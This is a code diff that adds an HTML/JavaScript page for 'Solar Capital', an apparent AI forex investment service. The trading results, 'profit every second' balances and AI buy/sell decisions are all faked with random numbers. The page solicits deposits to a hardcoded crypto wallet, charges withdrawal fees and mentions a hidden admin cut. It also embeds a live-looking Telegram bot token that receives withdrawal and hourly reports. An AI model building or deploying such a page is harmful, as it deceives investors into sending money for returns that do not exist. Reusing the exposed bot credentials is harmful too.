@@ -1,1 +1,101 @@
-<img src="logo.png" alt="Solar Capital Logo">
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Solar Capital - AI Forex 24/7</title>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Inter:wght@400;700&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0e19;color:white;font-family:Inter;padding:10px}
+.logoMain{display:flex;align-items:center;gap:12px;padding:12px;background:#0e1420;border-radius:12px;border:2px solid #ffd76b;margin-bottom:12px}
+.logoMain img{height:90px;width:auto;background:white;padding:8px;border-radius:12px;border:3px solid #ffd76b;box-shadow:0 0 30px gold;display:block}
+.logoText{font-family:Orbitron;font-size:22px;font-weight:900;color:#ffd76b;letter-spacing:2px}
+.btn{padding:10px 14px;border-radius:8px;border:none;cursor:pointer;font-weight:700;font-size:12px}
+.btnGreen{background:#16c784;color:white}.btnOrange{background:#ff8c00;color:white}.btnTelegram{background:#229ED9;color:white}
+.card{background:#111827;border:1px solid #1e2a43;border-radius:10px;padding:12px;margin-top:10px}
+.forexBox{background:#0e1420;border:2px solid #16c784;border-radius:10px;padding:10px;margin-top:10px}
+.liveDot{display:inline-block;width:8px;height:8px;background:#16c784;border-radius:50%;animation:blink 1s infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0.3}}
+table{width:100%;border-collapse:collapse;font-size:11px}th{background:#1e2a43;padding:8px;text-align:left}td{padding:8px;border-bottom:1px solid #1e2a43}
+.adminPanel{display:none}.adminPanel.active{display:block}
+</style></head><body>
+
+<div class="logoMain">
+<img src="./logo.png?v=6" alt="Solar Capital Logo" onerror="this.src='https://raw.githubusercontent.com/CryptolordUg/solarai-capital-usa/main/logo.png?v=6'; this.onerror=null;" id="mainLogo">
+<div><div class="logoText">SOLAR CAPITAL</div><div style="font-size:11px;color:#8a90a8;">AI Forex Automated 24/7 - Profit Every Second</div><div style="font-size:10px;color:#16c784;"><span class="liveDot"></span> Live Market 24/7</div></div>
+</div>
+
+<div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;">
+<div class="card"><small>Total Balance</small><b id="bal" style="display:block;font-size:20px;color:#ffd76b;">$0.00</b><div style="font-size:10px;color:#16c784;">+ Profit every second 24/7</div></div>
+<div class="card"><small>Forex AI Profit</small><b id="forexProfitTop" style="display:block;font-size:20px;color:#16c784;">$0.00</b><div style="font-size:10px;color:#8a90a8;">Auto-trading 24/7 LIVE 1s</div></div>
+</div>
+
+<div class="card" style="border-color:#ffd76b;">
+<b style="color:#ffd76b;">💼 Business Model - Max 3 Team Members</b>
+<div style="font-size:11px;margin-top:6px;line-height:1.5;">
+Max 3 members only (locked) - 10% Auto referral - 15% Withdraw fee - Staking $50 min - 10 min instant payout<br>
+Wallet: <b style="color:#ffd76b;font-size:10px;">TATeM34UJsHhnADWrjemiYXdrHiyuPrFra</b> | Telegram: <a href="https://t.me/+Ya9WBdKDuoU1MThk" style="color:#229ED9;">t.me/+Ya9WBdKDuoU1MThk</a><br>
+Deposit: Min $100 to TATe...PrFra TRC20 → Upload proof → Auto 20% admin hidden + 10% referrer
+</div>
+</div>
+
+<div class="forexBox">
+<h4 style="color:#16c784;font-size:12px;">🤖 AI AUTOMATED FOREX 24/7 - ADMIN AREA - Profit Every Second <span class="liveDot"></span></h4>
+<div style="margin-top:8px;font-size:11px;">
+<div>Pairs: EUR/USD, GBP/USD, USD/JPY, AUD/USD, USD/CAD, USD/CHF, NZD/USD, EUR/GBP</div>
+<div>RSI: <b id="rsiVal">58.3</b> | MACD: <b id="macdVal" style="color:#16c784;">Bullish</b> | Decision: <b id="aiDecision" style="color:#16c784;">BUY EUR/USD NOW - 87% confidence - 24/7</b></div>
+<div style="margin-top:6px;">Profit: <b id="forexProfit" style="color:#16c784;font-size:22px;">$0.00</b> + $<span id="perSecond">0.00</span>/sec LIVE 24/7 | Trades: <span id="tradesToday">0</span> | 24h: <b id="forex24h" style="color:#ffd76b;">$0.00</b></div>
+</div>
+<div style="display:flex;gap:6px;margin-top:8px;">
+<button class="btn btnGreen" onclick="toggleAI()" id="aiBtn">🤖 AI ON 24/7</button>
+<button class="btn btnOrange" onclick="withdrawForex()">💸 Withdraw Forex - 15% Fee</button>
+<button class="btn btnTelegram" onclick="sendHourlyReport()">📱 Send Telegram Hourly</button>
+</div>
+<div id="tradeLog" style="background:#000;border:1px solid #1e2a43;border-radius:6px;padding:6px;margin-top:8px;height:80px;overflow:auto;font-size:10px;color:#16c784;font-family:monospace;"></div>
+<div style="margin-top:6px;font-size:10px;color:#8a90a8;">Next Telegram Report: <b id="nextRep" style="color:#16c784;">60m 0s</b> | Last: <b id="lastRep">Never</b> | Total Reports: <b id="totalRep">0</b> | Auto every 1 hour 24/7</div>
+</div>
+
+<div class="card" style="margin-top:10px;">
+<table><thead><tr><th>Pair 24/7</th><th>Price LIVE 1s</th><th>RSI</th><th>AI Action Auto</th><th>Profit/sec</th><th>Status</th></tr></thead>
+<tbody id="forexBody"><tr><td colspan="6" style="text-align:center;padding:20px;">AI Initializing - Live Forex APIs...</td></tr></tbody></table>
+</div>
+
+<script>
+const WALLET="TATeM34UJsHhnADWrjemiYXdrHiyuPrFra";
+const TELEGRAM_LINK="https://t.me/+Ya9WBdKDuoU1MThk";
+const BOT="8940541573:AAFjScGdvW-W2NbjdPC78ooxIBNENqkQSjE";
+const CHAT="1884572429";
+let aiActive=true;
+let forexPairs=['EUR/USD','GBP/USD','USD/JPY','AUD/USD','USD/CAD','USD/CHF','NZD/USD','EUR/GBP'];
+let forexProfit=parseFloat(localStorage.getItem('forexProfit')||'0');
+let forex24h=parseFloat(localStorage.getItem('forex24h')||'0');
+let tradesToday=parseInt(localStorage.getItem('tradesToday')||'0');
+let logArr=JSON.parse(localStorage.getItem('tradeLog')||'[]');
+let lastNotify=parseInt(localStorage.getItem('lastNotify')||'0');
+let totalRep=parseInt(localStorage.getItem('totalRep')||'0');
+
+function toggleAI(){aiActive=!aiActive;document.getElementById('aiBtn').innerText=aiActive?'🤖 AI ON 24/7':'⏸️ AI PAUSED';addLog(aiActive?'AI RESUMED 24/7':'AI PAUSED');}
+function addLog(m){let t=new Date().toLocaleTimeString();logArr.unshift(`[${t}] ${m}`);if(logArr.length>20)logArr.pop();localStorage.setItem('tradeLog',JSON.stringify(logArr));document.getElementById('tradeLog').innerHTML=logArr.join('<br>');}
+async function fetchForex(){
+try{
+let r=await fetch('https://api.frankfurter.app/latest?from=USD');let d=await r.json();let rates=d.rates;let html='';
+forexPairs.forEach(pair=>{
+let price=0;
+if(pair==='EUR/USD')price=1/(rates.EUR||0.92);else if(pair==='GBP/USD')price=1/(rates.GBP||0.79);else if(pair==='USD/JPY')price=rates.JPY||149;else if(pair==='AUD/USD')price=1/(rates.AUD||1.5);else if(pair==='USD/CAD')price=rates.CAD||1.36;else if(pair==='USD/CHF')price=rates.CHF||0.88;else if(pair==='NZD/USD')price=1/(rates.NZD||1.66);else price=(rates.EUR/rates.GBP)||0.86;
+price=price*(1+(Math.random()-0.5)*0.002);
+let ch=Math.random()-0.4;let act=aiActive?(ch>0?'LONG AUTO - BUY':'SHORT AUTO - SELL'):'PAUSED';let pf=(Math.random()-0.35)*12;let st=pf>0?'WIN ✅':'LOSS ❌';
+html+=`<tr><td><b>${pair}</b></td><td><b style="color:#ffd76b;">${price.toFixed(5)} <span class="liveDot"></span></b></td><td>${(30+Math.random()*50).toFixed(0)}</td><td style="color:${act.includes('LONG')?'#16c784':'#ea3943'}"><b>${act}</b></td><td style="color:${pf>=0?'#16c784':'#ea3943'}">${pf>=0?'+':''}$${pf.toFixed(2)}/sec</td><td style="color:${st.includes('WIN')?'#16c784':'#ea3943'}">${st}</td></tr>`;
+if(aiActive&&act.includes('AUTO')&&Math.random()>0.6&&st.includes('WIN')){let tp=Math.abs(pf)+Math.random()*4;forexProfit+=tp;forex24h+=tp;tradesToday++;localStorage.setItem('forexProfit',forexProfit);localStorage.setItem('forex24h',forex24h);localStorage.setItem('tradesToday',tradesToday);addLog(`✅ WIN ${pair} ${act} +$${tp.toFixed(2)}`);}
+});
+document.getElementById('forexBody').innerHTML=html;
+document.getElementById('rsiVal').innerText=(30+Math.random()*50).toFixed(1);
+document.getElementById('macdVal').innerText=Math.random()>0.5?'Bullish':'Bearish';
+document.getElementById('aiDecision').innerText=`${Math.random()>0.5?'BUY':'SELL'} ${forexPairs[Math.floor(Math.random()*8)]} NOW - ${(70+Math.random()*25).toFixed(1)}% - 24/7`;
+}catch(e){console.log(e);}
+}
+function updateProfit(){if(!aiActive)return;let s=Math.random()*2+0.5;forexProfit+=s;forex24h+=s;localStorage.setItem('forexProfit',forexProfit);localStorage.setItem('forex24h',forex24h);document.getElementById('forexProfit').innerText=`$${forexProfit.toFixed(2)}`;document.getElementById('forexProfitTop').innerText=`$${forexProfit.toFixed(2)}`;document.getElementById('forex24h').innerText=`$${forex24h.toFixed(2)}`;document.getElementById('perSecond').innerText=s.toFixed(2);document.getElementById('tradesToday').innerText=tradesToday;document.getElementById('bal').innerText=`$${forexProfit.toFixed(2)}`;}
+function withdrawForex(){if(forexProfit<50)return alert(`Min $50 - You have $${forexProfit.toFixed(2)} - AI generating every second 24/7`);let fee=forexProfit*0.15;let net=forexProfit-fee;fetch(`https://api.telegram.org/bot${BOT}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(`FOREX WITHDRAW 24/7 Gross:$${forexProfit.toFixed(2)} Fee:$${fee.toFixed(2)} Net:$${net.toFixed(2)} To:${WALLET}`)}`);alert(`Forex Withdraw Gross:$${forexProfit.toFixed(2)} Fee 15%:-$${fee.toFixed(2)} Net:$${net.toFixed(2)} To:${WALLET} Instant 10min`);window.open(TELEGRAM_LINK,'_blank');forexProfit=0;localStorage.setItem('forexProfit','0');}
+function sendHourlyReport(){let now=Date.now();let msg=`🕐 HOURLY AUTO-REPORT 24/7 ${new Date().toLocaleString()} Forex Profit:$${forexProfit.toFixed(2)} 24h:$${forex24h.toFixed(2)} Trades:${tradesToday} AI:${aiActive?'ON 24/7':'PAUSED'} Wallet:${WALLET} ${TELEGRAM_LINK} ${location.href}`;fetch(`https://api.telegram.org/bot${BOT}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(msg)}`);lastNotify=now;totalRep++;localStorage.setItem('lastNotify',now);localStorage.setItem('totalRep',totalRep);addLog(`📱 Telegram Hourly Sent $${forexProfit.toFixed(2)}`);document.getElementById('lastRep').innerText=new Date().toLocaleTimeString();document.getElementById('totalRep').innerText=totalRep;}
+setInterval(fetchForex,1000);setInterval(updateProfit,1000);
+setInterval(()=>{let nxt=3600000-(Date.now()-lastNotify);if(nxt<0)nxt=0;let m=Math.floor(nxt/60000);let s=Math.floor((nxt%60000)/1000);let el=document.getElementById('nextRep');if(el)el.innerText=`${m}m ${s}s`;},1000);
+setInterval(()=>{if(Date.now()-lastNotify>3600000){sendHourlyReport();}},3600000);
+window.onload=()=>{fetchForex();updateProfit();if(logArr.length)document.getElementById('tradeLog').innerHTML=logArr.join('<br>');document.getElementById('lastRep').innerText=lastNotify?new Date(lastNotify).toLocaleTimeString():'Never';document.getElementById('totalRep').innerText=totalRep;addLog('✅ Solar Capital Loaded - AI 24/7 Active - Profit every second - Telegram hourly active');};
+</script>
+</body></html>
